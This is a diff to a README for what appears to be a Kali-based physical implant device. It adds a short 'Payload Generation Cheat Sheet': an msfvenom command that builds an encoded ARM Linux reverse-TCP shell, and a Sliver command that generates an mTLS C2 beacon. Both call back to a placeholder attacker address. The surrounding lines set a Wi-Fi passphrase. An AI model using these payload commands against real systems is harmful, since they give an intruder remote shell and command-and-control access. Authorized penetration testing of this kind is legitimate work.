@@ -199,6 +199,18 @@ and authenticating to the EJ Wi-Fi access point, you can SSH to EJ using the kal
     sudo sed -i 's/wpa_passphrase=.*/wpa_passphrase=Pa22word/' wifi/hostapd.conf
     ```
 
+## 💣 Payload Generation Cheat Sheet
+
+### MSFVenom
+```sh
+msfvenom -p linux/armle/shell/reverse_tcp -lhost=x.x.x.x -lport=443 -e x64/shikata_ga_nai -f elf -o payloadname
+```
+
+### Sliver
+```sh
+generate beacon --mtls x.x.x.x:port --save /path/to/save --arch arm --os linux
+```
+
 ## 🙏 Plug-and-pray
 Now its time to test your configuration and hope for the best!!
 
